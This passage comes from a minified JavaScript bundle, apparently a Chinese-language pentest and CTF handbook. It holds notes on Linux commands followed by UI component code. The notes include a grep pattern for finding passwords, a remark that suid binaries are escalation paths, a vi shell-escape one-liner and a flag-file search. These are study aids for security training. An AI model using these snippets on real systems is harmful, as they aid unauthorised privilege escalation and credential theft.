                              \u8D44\u6599\uFF1Ahttps://unix.stackexchange.com/questions/335716/grep-returns-binary-file-standard-input-matches-when-trying-to-find-a-string
                              \u50CF\u5904\u7406\u3010\u6587\u672C\u6587\u4EF6\u3011\u4E00\u6837\u5904\u7406\u3010\u4E8C\u8FDB\u5236\u6587\u4EF6\u3011
                                  \u5F53\u62A5\u9519\u3010Binary file (standard input) matches\u3011\u65F6\uFF0C\u7528\u8FD9\u4E2A\u9009\u9879

                          \u3010-C  <\u6570\u5B57>\u3011
                              \uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F

                          \u3010-E\u3011
                              \u5C06\u3010\u5339\u914D\u6A21\u5F0F\u3011\u5207\u6362\u4E3A\u3010\u6B63\u5219\u8868\u8FBE\u5F0F\u3011\u6A21\u5F0F
                                  \uFF08\u592A\u68D2\u4E86\uFF0C\u8FD9\u662F\u6211\u975E\u5E38\u719F\u6089\u7684\u9886\u57DF\uFF01\uFF01\uFF01\u80FD\u591F\u5B9E\u73B0\u5F88\u591A\u3010\u590D\u6742\u7684\u67E5\u627E\u529F\u80FD\u3011\uFF09
                              \u603B\u7ED3\u51FA\uFF0C\u4E00\u4E9B\u5E38\u7528\u6A21\u5F0F\uFF1A
                                  (pwd)|(pass)|(passw)
                                  \uFF08\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\u8FD9\u91CC\uFF0C\u53EF\u4EE5\u548C\u3010web\u654F\u611F\u5185\u5BB9\u3011\u653E\u5728\u4E00\u5757\u513F\uFF01\uFF01\uFF01\uFF09

                      cut
                          123

                      tr
                          123

                      sed
                          123


                  \u4E8C\u8FDB\u5236\u76F8\u5173

            `,B.\u540C\u540D\u65B9\u6CD5_\u547D\u4EE4_Helper.strings.Linux\u65B9\u6CD5,`


                      file
                          \u67E5\u770B\u6587\u4EF6\u7C7B\u578B
                              file  <\u6587\u4EF6\u8DEF\u5F84>

                              \u5982\u679C\u6709\u3010suid set\u3011\u96C6\uFF0C\u5219\u662F\u3010\u6709\u6F5C\u529B\u3011\u7684\u3010\u5229\u7528\u8DEF\u5F84\u3011\u3002
                                  \uFF08\u89C1\u3010\u6743\u9650\u63D0\u5347\u3011\uFF09

                          \u68C0\u67E5\u4E8C\u8FDB\u5236\u3010\u6587\u4EF6\u7C7B\u578B\u3011
                              file  <\u4E8C\u8FDB\u5236\u6587\u4EF6>

                          \u6B64\u5916\uFF0C\u8FD8\u6709\u4E00\u4E9B\u3010\u7B2C\u4E09\u65B9\u5F00\u6E90\u5DE5\u5177\u3011\uFF1A
                              \u300ADiE\u300B\uFF0C\u89C1\u300A\u300B

                      checksec
                          \u68C0\u67E5\u4E8C\u8FDB\u5236\u3010\u5185\u5B58\u4FDD\u62A4\u3011

                          \u7528\u6CD5\uFF1A
                              checksec  <\u4E8C\u8FDB\u5236\u6587\u4EF6>

                      xxd
                          \u7528\u4E8E\u3010\u4E8C\u8FDB\u5236binary\u3011\u548C\u3010hexdump\u5341\u516D\u8FDB\u5236\u8F6C\u50A8\u3011\uFF0C\u4E4B\u95F4\uFF0C\u8FDB\u884C\u8F6C\u6362\u3002

                          binary \u8F6C hexdump\uFF1A
                              xxd  <\u4E8C\u8FDB\u5236\u6587\u4EF6>

                          \u6587\u672C \u8F6C \u4E8C\u8FDB\u5236\u8F6C\u50A8\uFF1A
                              xxd  -b  <\u6587\u672C\u6587\u4EF6>

                          hexdump \u8F6C binary\uFF1A
                              xxd  -r  <\u8F93\u5165\u6587\u4EF6>  <\u8F93\u51FA\u6587\u4EF6>
                              xxd  -r  <\u8F93\u5165\u6587\u4EF6>  >  <\u8F93\u51FA\u6587\u4EF6>


            `,Object(r.d)({\u667A\u80FD\u6B65\u9AA4_cfg:O.\u6743\u9650\u63D0\u5347_\u63D0\u6743_\u540E\u6E17\u900F_\u5185\u7F51\u6E17\u900F_\u624B\u518C}),`
                  more
                      \u3010space\u3011\u4E0B\u4E00\u9875
                      \u3010back\u3011\u4E0A\u4E00\u9875

                  less
                      \u3010Ctrl+F\u3011forward\uFF0C\u4E0B\u4E00\u9875
                      \u3010Ctrl+B\u3011back\uFF0C\u4E0A\u4E00\u9875

                  head

                  tail

                  tee
                      tee  -a  <\u6587\u4EF6\u8DEF\u5F84>


                  \u6587\u672C\u7F16\u8F91

                      \u3010vi\u3011

                          \u3010\u547D\u4EE4\u6A21\u5F0F\u3011

                              \u3010i\u3011\uFF0C\u8FDB\u5165\u3010\u8F93\u5165\u6A21\u5F0F\u3011
                              \u3010:\u3011\uFF0C\u8F93\u5165\u3010\u547D\u4EE4\u884C\u3011
                                  \u3010:w\u3011\uFF0C\u5199\u5165
                                  \u3010:q\u3011\uFF0C\u9000\u51FA
                                  \u3010:!\u3011\uFF0C\u4EE3\u8868\u5F3A\u5236\u6267\u884C\u3010\u53E6\u4E00\u547D\u4EE4\u3011
                                      123

                          \u3010\u8F93\u5165\u6A21\u5F0F\u3011

                              \u3010ESC\u3011\uFF0C\u8FDB\u5165\u3010\u547D\u4EE4\u6A21\u5F0F\u3011


                          \u547D\u4EE4\u884C\u8FD0\u884C

                              vi  -c  ':!/bin/sh'  /dev/null
                                  \u5FC5\u987B\u8981\u7528\u3010\u5355\u5F15\u53F7\u3011\uFF0C\u624D\u80FD\u6B63\u5E38\u8FD0\u884C
                                      \u3010\u53CC\u5F15\u53F7\u3011\u4F1A\u62A5\u9519

                                  \u540E\u9762\u7684\u3010/dev/null\u3011\uFF0C\u662F\u7528\u6765\u5E72\u561B\u7684\uFF1F
                                      \u597D\u50CF\u53BB\u6389\uFF0C\u4E5F\u6CA1\u5565\u5F71\u54CD\uFF1F\uFF1F\uFF1F

                              \u5E38\u89C1\u9009\u9879
                                  \u3010-c\u3001 --cmd\u3011\uFF0C\u8FD0\u884C\u547D\u4EE4



              \u79FB\u52A8\u590D\u5236
                  mv  <\u6E90\u76EE\u5F55\u6216\u6587\u4EF6>  <\u76EE\u6807\u76EE\u5F55\u6216\u6587\u4EF6>
                      \u76EE\u5F55\u4EE5\u3010/\u3011\u7ED3\u5C3E\uFF0C\u6587\u4EF6\u4E0D\u4EE5\u3010/\u3011\u7ED3\u5C3E

                  copy  <\u6E90\u76EE\u5F55\u6216\u6587\u4EF6>  <\u76EE\u6807\u76EE\u5F55\u6216\u6587\u4EF6>
                      \u3010-r\u3011\uFF0C\u9012\u5F52\u590D\u5236\uFF0C\u4FDD\u7559\u7ED3\u6784

              \u67E5\u627E
                  locate  <\u6587\u4EF6\u540D\u5982\u661F\u53F7>.<\u540E\u7F00\u540D>
                      \u6839\u636E\u6587\u4EF6\u540D\u67E5\u627E
                      \u652F\u6301\u3010glob\u901A\u914D\u7B26\u3011

                  find

                      \u5C0F\u6280\u5DE7\uFF1A
                          \u4E0D\u663E\u793A\u3010\u9519\u8BEF\u4FE1\u606F\u3011\uFF0C\u53BB\u9664\u76F8\u5173\u5E72\u6270\uFF0C\u5E76\u4E14\u3010\u63D0\u9AD8\u641C\u7D22\u6027\u80FD\u3011\uFF1A    \uFF08\u5C31\u5F88\u795E\u5947\uFF09
                              \u4F7F\u7528\u3010\u7BA1\u9053\u7B26\u3011\u5373\u53EF\uFF01\uFF01\uFF01
                                  \u6211\u91CD\u65B0\u590D\u5236\u4E00\u904D\uFF1A\u30102>/dev/null\u3011
                                      \u6BD4\u5982\u3010find / -name *flag.txt*    2>/dev/null\u3011

                      \u6839\u636E\u3010\u6587\u4EF6\u540D\u3011\u67E5\u627E
                          find  <\u76EE\u5F55\u8DEF\u5F84>  -name  <\u6587\u4EF6\u540D\u53EF\u7528glob\u8868\u8FBE\u5F0F>

                              \u3010-type  d\u3011\uFF0C\u7C7B\u578B\u4E3A\u76EE\u5F55
                              \u3010-type  f\u3011\uFF0C\u7C7B\u578B\u4E3A\u6587\u4EF6

                      \u6839\u636E\u3010\u7528\u6237\u7EC4\u3011\u67E5\u627E
                          find  <\u76EE\u5F55\u8DEF\u5F84>  -group  <\u76EE\u6807\u7528\u6237\u7EC4>
                              \u641C\u7D22\uFF0C\u5C5E\u4E8E\u3010\u76EE\u6807\u7528\u6237\u7EC4\u3011\u7684\u76F8\u5173\u6587\u4EF6

                      \u6839\u636E\u3010\u65F6\u95F4\u3011\u67E5\u627E
                          find  -newerXY  <variable>
                              \u53C2\u8003\u8D44\u6599\uFF1A
                                  (\u6709\u70B9\u5C0F\u7455\u75B5)https://blog.csdn.net/ligeforrent/article/details/75352245

                              \u65E8\u5728\u627E\u5230\u4E00\u4E9B\u3010X\u5C5E\u6027\u3011\u6BD4variable\u7684\u3010Y\u5C5E\u6027\u3011\u66F4 \u3010\u665A\u3011 \u7684\u6587\u4EF6     \uFF08\u8FD9\u53E5\u8BDD\uFF0C\u53C2\u8003\u8D44\u6599\u6B63\u597D\u628A\u5B83\u8BF4\u53CD\u4E86\u3002\u6211\u8FD9\u91CC\u624D\u662F\u5BF9\u7684\uFF09

                                  X\u6307\u4EE3find\u7684\u76EE\u6807\u6587\u4EF6\u5C5E\u6027
                                      X\u53EF\u9009a,c,m;
                                  Y\u4EE3\u8868\u53C2\u7167\u5C5E\u6027\u3002
                                      Y\u53EF\u9009a,c,m,t\u3002
                                  acm\u610F\u4E49\u5206\u522B\u4E3Aatime\uFF08\u8BBF\u95EE\u65F6\u95F4\uFF09\uFF0Cctime(\u6539\u53D8\u65F6\u95F4\uFF09\uFF0Cmtime\uFF08\u4FEE\u6539\u65F6\u95F4\uFF09\u3002
                                  t\u4EE3\u8868\u5BA2\u89C2\u7EDD\u5BF9\u65F6\u95F4\uFF0C\u53EA\u4F5C\u4E3A\u53C2\u7167\u5C5E\u6027\u5B58\u5728\uFF0C\u683C\u5F0F\u4E3Ayyyy-MM-dd hh:mm:ss\u3002

                              \u5B50\u53D8\u79CD
                                  find ./ -newermt "2016-01-18" ! -newermt '2016-01-19'
                                      \u4FEE\u6539\u65F6\u95F4\uFF0C\u665A\u4E8E\u30102016-01-18\u3011
                                      \u4FEE\u6539\u65F6\u95F4\uFF0C\u4E0D\u665A\u4E8E\u30102016-01-19\u3011

                      \u5E38\u89C1\u9009\u9879
                          \u3010-ls\u3011
                              \u5C06\u7ED3\u679C\u8FDB\u884C\u6253\u5370\u3002        \uFF08\u7C7B\u4F3C\u4E8E\u3010ls\u547D\u4EE4\u3011\uFF09

              \u89E3\u538B\u7F29\u6587\u4EF6

                  \u67E5\u770B\u5185\u5BB9
                      unzip  -l  <\u538B\u7F29\u6587\u4EF6\u8DEF\u5F84>

                  \u89E3\u538B
                      unzip  <\u538B\u7F29\u6587\u4EF6\u8DEF\u5F84>
                          \u89E3\u538B\u5230\u5F53\u524D\u76EE\u5F55

                      unzip  <\u538B\u7F29\u6587\u4EF6\u8DEF\u5F84>  -d  <\u89E3\u538B\u5230\u76EE\u5F55>
                          \u89E3\u538B\u5230\u6307\u5B9A\u76EE\u5F55

                      unzip  <\u538B\u7F29\u6587\u4EF6\u8DEF\u5F84>  -d  <\u89E3\u538B\u5230\u76EE\u5F55>  -o
                          \u89E3\u538B\u5230\u6307\u5B9A\u76EE\u5F55\uFF0C\u8986\u76D6\u539F\u5148\u7684\u6587\u4EF6

                  \u5E38\u89C1\u9009\u9879
                      \u3010-o\u3011
                          \u8986\u76D6\u539F\u5148\u7684\u6587\u4EF6

            `))})},{name:"\u67E5\u770B\u624B\u518C",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u67E5\u770B\u624B\u518C"),`
              man  <\u5177\u4F53\u547D\u4EE4>

                  \u3010h\u3011\uFF0C\u67E5\u770B\u3010man\u3011\u672C\u8EAB\u7684\u5E2E\u52A9

                  \u3010q\u3011\uFF0C\u8FDB\u884C\u9000\u51FA


            `))}]},g={name:"\u3010Linux\u3011_\u3010Unix\u3011_\u624B\u518C",steps:[I,{name:"\u5E38\u89C1\u3010\u9690\u79C1\u6587\u4EF6\u3011",desc:l.a.createElement(l.a.Fragment,null),content:Promise.all([Promise.resolve().then(n.bind(null,"QL8i"))]).then(function(w){var a=Object(S.a)(w,1),B=a[0];return B.\u5E38\u89C1\u9690\u79C1\u6587\u4EF6_\u654F\u611F\u6587\u4EF6_\u91CD\u8981\u914D\u7F6E\u6587\u4EF6_Helper.Linux.then(function(O){return l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                  `,O))})})}]},c=g,h=I},"+ULl":function(H,d,n){"use strict";n.d(d,"a",function(){return F}),n.d(d,"b",function(){return p}),n.d(d,"c",function(){return I}),n.d(d,"d",function(){return g}),n.d(d,"e",function(){return c});var S=n("k1fw"),t=n("5Dmo"),l=n("3S7+"),r=n("+BJd"),e=n("mr32"),u=n("q1tI"),m=n.n(u),E=n("ysNt");function F(h,w){var a=arguments.length>2&&arguments[2]!==void 0?arguments[2]:!1,B=1.5,O=a?h:m.a.createElement(e.a,{style:{fontSize:"".concat(B,"rem"),lineHeight:"".concat(B/3*5*1.2,"rem"),wordBreak:"inherit",whiteSpace:"inherit"}},h),_=w?m.a.createElement("div",null,O,m.a.createElement("ol",null,[w].flat(1).map(function(b){return m.a.createElement("li",null,b)}))):a?m.a.createElement("span",{style:{display:"inline-block",padding:"5px 12px"}},O):O;return{value:h,label:a?m.a.createElement(l.a,{placement:"leftBottom",title:h}," ",_," "):_}}function p(h,w){return F(h,w)}function I(h,w){return m.a.createElement("span",{style:{marginTop:"4px",display:"inline-block",background:"yellow",fontSize:(w==null?void 0:w.fontSize)||"",lineHeight:(w==null?void 0:w.fontSize)||""}},h)}function g(h,w){var a="\u89C1 \u300A".concat(w,"\u300B \u5185 \u300A").concat(h,"\u300B \u7684\u8BE6\u7EC6\u5185\u5BB9\u3002"),B={background:E.l.getColor("lime",6)||""},O=Object(S.a)({my_reference:!0},F(h,[m.a.createElement("h2",{style:B},a)]));return O}var c=["GB2312","GBK","GB18030","BIG5","Shift_JIS"]},"/kpp":function(H,d,n){"use strict";var S=n("rePB"),t=n("wx14"),l=n("U8pU"),r=n("q1tI"),e=n.n(r),u=n("TSYQ"),m=n.n(u),E=n("o/2+"),F=n("H84U"),p=function(h,w){var a={};for(var B in h)Object.prototype.hasOwnProperty.call(h,B)&&w.indexOf(B)<0&&(a[B]=h[B]);if(h!=null&&typeof Object.getOwnPropertySymbols=="function")for(var O=0,B=Object.getOwnPropertySymbols(h);O<B.length;O++)w.indexOf(B[O])<0&&Object.prototype.propertyIsEnumerable.call(h,B[O])&&(a[B[O]]=h[B[O]]);return a};function I(h){return typeof h=="number"?"".concat(h," ").concat(h," auto"):/^\d+(\.\d+)?(px|em|rem|%)$/.test(h)?"0 0 ".concat(h):h}var g=["xs","sm","md","lg","xl","xxl"],c=r.forwardRef(function(h,w){var a,B=r.useContext(F.b),O=B.getPrefixCls,_=B.direction,b=r.useContext(E.a),y=b.gutter,j=b.wrap,v=b.supportFlexGap,x=h.prefixCls,T=h.span,R=h.order,s=h.offset,o=h.push,i=h.pull,f=h.className,P=h.children,D=h.flex,C=h.style,M=p(h,["prefixCls","span","order","offset","push","pull","className","children","flex","style"]),L=O("col",x),J={};g.forEach(function(au){var hu,mu={},Pu=h[au];typeof Pu=="number"?mu.span=Pu:Object(l.a)(Pu)==="object"&&(mu=Pu||{}),delete M[au],J=Object(t.a)(Object(t.a)({},J),(hu={},Object(S.a)(hu,"".concat(L,"-").concat(au,"-").concat(mu.span),mu.span!==void 0),Object(S.a)(hu,"".concat(L,"-").concat(au,"-order-").concat(mu.order),mu.order||mu.order===0),Object(S.a)(hu,"".concat(L,"-").concat(au,"-offset-").concat(mu.offset),mu.offset||mu.offset===0),Object(S.a)(hu,"".concat(L,"-").concat(au,"-push-").concat(mu.push),mu.push||mu.push===0),Object(S.a)(hu,"".concat(L,"-").concat(au,"-pull-").concat(mu.pull),mu.pull||mu.pull===0),Object(S.a)(hu,"".concat(L,"-rtl"),_==="rtl"),hu))});var q=m()(L,(a={},Object(S.a)(a,"".concat(L,"-").concat(T),T!==void 0),Object(S.a)(a,"".concat(L,"-order-").concat(R),R),Object(S.a)(a,"".concat(L,"-offset-").concat(s),s),Object(S.a)(a,"".concat(L,"-push-").concat(o),o),Object(S.a)(a,"".concat(L,"-pull-").concat(i),i),a),f,J),V={};if(y&&y[0]>0){var tu=y[0]/2;V.paddingLeft=tu,V.paddingRight=tu}if(y&&y[1]>0&&!v){var Y=y[1]/2;V.paddingTop=Y,V.paddingBottom=Y}return D&&(V.flex=I(D),j===!1&&!V.minWidth&&(V.minWidth=0)),r.createElement("div",Object(t.a)({},M,{style:Object(t.a)(Object(t.a)({},V),C),className:q,ref:w}),P)});c.displayName="Col",d.a=c},"1WT5":function(H,d){H.exports="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZgAAAD4CAIAAABe2mfsAAAcZklEQVR4Xu2dXYhdx33AEzq3n1eyVlp9erV6MATUqBDqCooEaYPViiYQagp+aOQ0RH1RU0xlV6AELHBQHkT14FS0rmJY7Lim6wcbUSGUIiNkthKRKEL4QWuhVFESbe1oqb5o6rSEbs+cj/mec8/e3XP3zu5v+SF0zzkz938+5ndn5syZ8wnR3QYAkDSf8BcBAKQFIgOA5EFkAJA8iAwAkgeRAUDyIDIASB5EBgDJg8gAIHkQGQAkDyIDgORBZACQPIgMAJIHkQFA8iAyAEieQYnslWudR48kV1+zlu84IE5d69x9JIq1t691ju1z0/pkqd663LkzW+Z5b1Z8cFk8t9fd7LlJ8cFM5165TefqGbFvl7uNSSxIn4YBaI50budbPprpPG8u3yteOSduz5ZBFkfg+AEveS3PnyuP3p1z1vJ5BwmQKgMR2Y4T4m5VUE1H7DjS+UG1XDPbefuIm4OVm5KCw4x42ZDgq5WV7G06hyIuiwXp0zAAk7dvla6xRLZPXK0sY9HrCFgcFOoYmiLrI0iAZBmAyHaJszO6IJmOeLcqxlcnxY6sAvVOp1SJU22xOXWrSCVuT4n9e2X+x6dKTdy9LPPJttlxUpR1nJnOS8/Iis9b0+V3OdWWkniQPk0CMHl6Ule4zF17+XK58O60OPSMXKKPwC2x38snyES1X86uzTdIgJRpX2Sq4VOgHXGics0t8ZVq4zerYnnppJtPyX5Zi/koN+CEqlvtEu+X+YtX8iVff0dcn5FSuHSi2ua1Kgzj6xTRIH2aBaB5Rlwxq12GyN6dKfIRZ436V+VTcfqw99Uen39N1yIfmSKbb5AAadO2yIyGT4FyxFfOVAuv6e2VUO5d9rKq5WpVRE0pmOyYrL5uWnzeWRsPsjmxAI5X1a6S2spmV4usQQy7xCW7ZRqubBrEggRInJZFVjV8hOpyVuXzOVUJCoksWG+KseO4+KgqzG/mbTSH3Qd1b9QVTxA1QTYkFsCOI507hWJmQn1kPvvE9SqfC8e9tTaHymMl7lTuqxdZLMgoT4rnT4rT5zrvTpWcPSMO7RcvTXbOVks05zrfPSE+u8PLBGAQtCmyquEjrr8TqmjopmVH9QepbqMeBd5Edm9VmpgVL3obvF32FslIpk663UM9gmxCPIDTxfLZrPA3Epl5g+K79a6p+vI/mhITVao6kcWDDPOk+NY5o2uvomiuxrh+RuzFZbAEtCcy1fDJi27AEUbL6P13xO5tYt8JoW+01RZ481tUMc74wRlvg23iglH27lwTL5rjD3oG2ZN4APurtrOsA6oeuvh+vWj0093r1R9f3gadFa88o/UXFVk8yBif2iem8iNzYVIcP1Hy8qT4QH5p5/RremHBK+/k1b3i1oqXG0DLtCYy1fApumOCjvj8CVG0vAx6F3iNXT6zUn08NLRib160XlT1CyPnJkHWURPAPvF+vvDetHh6W2+RmRbLePugu4GJug36/qT82ENkNUHG2XEgv0cxK17erxfuPtKRIpsRb50Rl87lN0OrVb9zMN/fGdFkGCDAYtOSyIyGz458ScwRuw+LK9WY1TvTnWMnq36cSIE3sUeK9e7ArkYkVLcyGwcZoyYANbb2zaJg14qs8mmzb1e3QQtF9hJZTZA1hEV2OK+RzXSu56teNWyLyGBJaUdkb07rhk+xpKkjVIH37y3aOONdz37L3cDHKfD9B2nn5gdQdauL28oscZE5FruSD6nzv07x0lSxpThdKalGZDVB1hMUWVa5e/E1MXFCXJhBZDBUtCOy6jZ/lJgpVKnOakn+Wn8zyayYaPZMjyrVRSdR30F2ewXgjEoLUOnsaXsgWBPRmAN3gyid1QdZz/gzcphblvCDy8K+QSnevdwpas2XjIUX5HNmnXu3Ol//opsVQPssoci+KM7eEh/ljxmqQZuq9fduvEirMQ2SSBXg9C15f+2ePYhBPUhQZN4oSC/nboMAmoqs6keTzHbebDACtttYZD2D7MGn5JOqXg+m5gfT/j1NeVP4M35WAK3Tjsh8gq02NYo9a4Ltzh/QUWP91YAMLYVquJl+bjFr3UTKpx6GOiPkM9i7xEvGCLXY0z+1QeqFTQJwCTUtjbGydV1XPUexBpuW/QTpsfeg+JZ9d7LgxcPiM58TXztuLfz6ATHu5QAwEJZUZM4TNsGC54rsgDsK36Yq7eawKZPaR6aDQboLGwbgEBLZJTethYqhH5H1FyRAqiypyDKePtG5qmfaEden3HlmHJHpJ43CGEV0lzh+xp7G55z4Wu3Ig2CQzsJ5BGDii8xs+oVYiMj6DBIgVQYlMgCA1kBkAJA8iAwAkgeRAUDyIDIASB5EBgDJg8gAIHkQGQAkDyIDgORBZACQPIgMAJIHkQFA8iAyAEgeRAYAyYPIACB5EBkAJA8iA4DkQWQAkDyIDACSB5EBQPIgMgBIHkQGAMmDyAAgeRAZACQPIgOA5EFkAJA8iAwAkgeRAUDyIDIASB5EBgDJg8gAIHkQGQAkDyIDgORBZACQPIgMAJJnYCKb3P6due17jCV7bj71nbkCa7nN6AvlNv5metWxi10vYUb32YexVVZyL+cKN2aZYZVk57NHve1d5Fe8MKmXbL+4s0peExgAzJcBiaywhpZCbrHqo+sLK5Uq8LkF1GbmKtcXxvYxX9TkbG1jLM8tdnO0XCtj7uGywtQqsHj8ALBABiKyrEgfe+gWY1M9cgO/VLuCM1Jlqx6Ob69WSUcoxRQcHT82t/NYrEZWk3OFG3OeoWGu+upeEeHOYzpbd3sZs7ELALAA2hdZWWJNd7hSCJkoQEA3OrklhWJL1x1x3JwDMbvUZl7uoJutiRczAPRN2yJTzrKk4JZw2QrrWapjrTn5FV5uUou1rjFxcg7HbON9qYH6Xnc3nW0auBsAmtCuyAyV2FKw+shyKfQQWb6NZ6WiG8tOq7+omcjcnKMxG+TfG9GQUdWKiszafQBYKG2KzGo9eVLQdy0fju+pb2cVpouIo2v1o5vuaCAyL+f6mHNyi8WitVrNYZHlOx6qWgJAn7QoMnOwgsYv2F3dGHSXSzzXhKiUIdXjfmOtdJyce8ZcazF7gIXG+AosBtACLYrMxqrdOHWlcM1F4rb7Srye8mAOtTWySM4Wbo2srkUZwo2KFiVAOyyNyKxBVfGefimCsGtsDUVyqBFZPGcTT77zsZhwRBYZrQYAC2eJRNa1+8iCdatgM03bp2gYBnJQROt9PXJWmDEHG62l19yal/+NZW3OBa8BLAoDExkAQFsgMgBIHkQGAMmDyAAgeRAZACQPIgOA5EFkAJA8iAwAkgeRAUDyIDIASB5EBgDJg8gAIHkQGQAkzxKI7M/+dJ2/EACgb1oU2b9vX+Pw4G9+Jfv3hzsf81c5+Lk1JDajTk5wKh6PwHw+ADDUtCiyW9vXFMz88Sr1/7lbn/iPZ7rqYww/t4b0Ell45jJN+A2bADDUDEJk947+6k/+YHX2nx9/dnVmsZ/++W/8+PdW337yMd9fAxFZvF6WJURkAAnSrsju/NGqj0+Jgkd//8s//K3SU/99Svjy6kdkeprZOoxZXu0a2faLOx1tITKABGlXZAVZc/Jj21w/eUpW0GrwcwvjecerkckZsREZwPKmdZH95zd+7cN93btf+/Uf/a5sS/7wM4/94uonM7X58hqYyILT5z9VvKXNyxAAhp/WRZaZq/jPh1/q/mj36kxhv/i3T/7494eqRjY5rl406WUIAMNP6yJz+Pn3fmnm6cW7a7kofWTbJ7cr2SEygAQZtMh+9k8df6GPn1sYzzt91cjyVUUqL0MAGH4GLbKG+Lk1xBOZSS6yPaGXWpbcHEVkAAmy8kTGgFiAZcdKE5lfC/NAZACpsdJERo0MYBmy3EQGACsQRAYAyYPIACB5WhQZAMBgQGQAkDyIDACSB5EBQPIgMgBIHkQGAMmDyAAgeRAZACQPIgOA5EFkAJA8iAwAkmcgIjt88f5c9ndzwl/VnZyWq6q/G8YMPG/czBbcf696LYjO6uH5w34+UdyJfdxp/m+OhlZVs2MXGBOZOXMEbdfzzcqXMJmrAGBQDEJkh957OPfg4f2wleam31BLjp5/MDf34OKh4mMuMld/8xVZ4SbDPt1nH4ZnHMuVpF9Bomcuyy1W5WBrUa4q/WUmB4DBMgCRST1lCpu4YUgqJxectcTylBTZw/sP7Gra/EQmZ1LcecwSmVtBiyzXH6XUjFqbMTuj48SoIgGgZdoXWe4jqR71n2qVFFm4vakS3pxwam2myHpITb4/Kasu2YYqF8Y21kuqqWI9PenXMrlOlJUyU3kAMCBaF5lRESurZsZa3UHmtjq7lcgc3/WQl0YJyG8MhjrI5HKrYagqYoEaWaE8z31SZL2m0gaAFmhbZFJVqj4VrILlC/WfrnxVIiv7zooGZkORGU6xRJb3ZCn7SNmVkoqLzO4jy5MgMoDhomWRaRnluL37DkUFzewjMytiecJGIrMU4zYALVT1qkZk5WbVrcnJKnNEBjAstCqyvCbl/5md9y7SZWUz05ZgWZtrIjJjSESoFWmiZORZKfo6Ja08V5H0kQEsEW2KLFT/yn1UmMhwlsboR3Nqc0V9TQ7j6CUyG0s3oQ6voJX0R6eeZeTAXUuAIaFFkQVGV3RLuxWqKnrHLNOZ8nJFpkaWLUBk5sivYpVST3QcmaysVTlYya2PjCMDWDraE1mwwiWxBpTlXtN/pvh8kRVpmw6/KHEbgOaNS6cC1WBkvzt0g5H9AENAeyIDABgQiAwAkgeRAUDyIDIASB5EBgDJg8gAIHkQGQAkDyIDgORBZACQPIgMAJIHkQFA8iAyAEgeRAYAyYPIACB52heZMRuPMz1/8WdP9aMnVsxn7An8xWfKBoAVStsik2IyXz7izFDmLJGmqybCzkTmTWdm5VaL/bYkYz6ygczj6r0BYHHIp3g09yu0g0tCd89kzSGVU8KpUFs/+A3YM7nwGcmL19BULOxdDYsRz3yx4097ivZsX9oVmfJUMeP++R4im5xW7397cPF83yJzJ2vNy39VflIWmYE7Z/dSUndIi4knnTnElzbyxTh01tzC3XJKzj7P+GLEM0/yn3lnlvYFunhJaVlkhy/eL2Z8rSbvr62RZZLKp3utNu67RhYoV8a8+4G1iw8iKzBnCa9fOEAW4dAFzq83EXFjFiGe+eFaOL4wFdoVmdkjZk7S7/yVtjLnvM5bl71E5r/ut8R4W2WAotSNq8ZOfLZrPXV14cE9elbr6iK2G7C6iZFf6M/626vcqu3tlwls3xOfU9vBv/qDkddnaySxCmEwq8hBMFoo3k96s/fjGQ1PvbF7mmR4ei/U8XQ302fTcU31MTCbudlg14c0i2rnsxeLb/R+k2RusRPkGMG0vNmaK5PPJ56nXrioVsnk+kJyXo5TJQ+LNWDhADXXwLNqlQxPn77q6+InZZvXPVLtYOTqysMw9i5yRbUrspI3bqqZ+GtrZNXG1Z2BXiKrIVJuc4qLqVpu1Q5sAxoXa3HFWJejL0r3HSV6G/NkWCemWZIgtsiikddkm1+pppGLJNGs4gfBLKsWvm1dvFa/WXF2vtr8Ouv/6hi6xzMgsq4TlaUkM+e8fEZPgaEkbwe9U2w4yy63+kQ0jMfcBX3ctDqtch4RVsQFJuaJKA5+6BoolVR+Rb7K+m0LnBSn3ppfnMXH6NXlHZDQldZtX2Rlt1fx0dWWu8R6LfkC71oal5pxuN2Cah4aecStE6+uMOMkSUKXgv07bB1985LKf+eNI6CziiYJY1398cjj2UaaQvGs4gchdnnJtMHlCvdI6mJvnyZDB0W2IanZGTYTmRuh/qIGTa28HCqCZ985Sr71uv3FY+2dPv6WQyPIkEJhaOyjbeZvXwP2edchuXvqnmWNvgjjV5ex425gitZFNnHj4fn3ine49ewjK6tgRfOzoa2aUVxw4VJnfLSvyxJVho0z4Z0Y98xFS1H5I2bTq+AF8X7GvWy1yELZxq6JeFbxg1Ansvoy420gs8qvbDvPWpFZX612MLbjXnJ3Zw1xBEQfpszHrHfkUflF3fyKkn7iiYjMvMBiwXtXr4d37Sn32Wn9vdMiC58UI6HaQS2y8NWl7RyPvGWRFd1exnvF6/rIivfvusPKdIUu1NJsjjyU+qc+KDLnN8Gk5ih3gz+DsVKkw/CIJYlgKqAmcjcf9TEispqs4gfBu3AD21ioeocnMlVcByOymmrXvEQmysJpnpFsx8MHWRXjclU/8cREViHzjOkscmkpW/kbqAgXLDK5FzIwY397iqw6+162mpZF5lFfI/ORrcsbFw/N5y2WEVnYbZagyMIJc2qOcrjkx0pR/oMZuLZqkkTwamThyN187EsqEEk8q/hBqLnCQt9iHATXdLHTVCsyU4U6Q3vHzdNUk9wgFHlJOJV1RmTA+d2ekMdVJp7NwznnzE9kBd7vRM32NS04vX1zkTU5KTVXgv9F+Y2O8JU5IJGVrwcvm40NRFa+2VdW3+wXlecVOveVvT75cYz8pLhH3/qYJ9SHT5/a6FGWJyZ0uUf1UfxUWpdg+GdwXiKLR+7m40RiJ1FVoWBW0YPgBmORG8Q8RPlvslXgg8ffPk31IlP5m78TVs5FRaDccWtH7DNo+K5GZGUqywWhwm9vYxdvY/t+4omILHJOPdz4nZNufcxjCIXqnCNHZMGTIrdRR6msnTUQWXkVmUtsuu2KrFCY3bSsE1k5AqMaExtyVl5HKw9QbPiFpNzzioi5wh/9VIHDKj9aG1fk5zKuj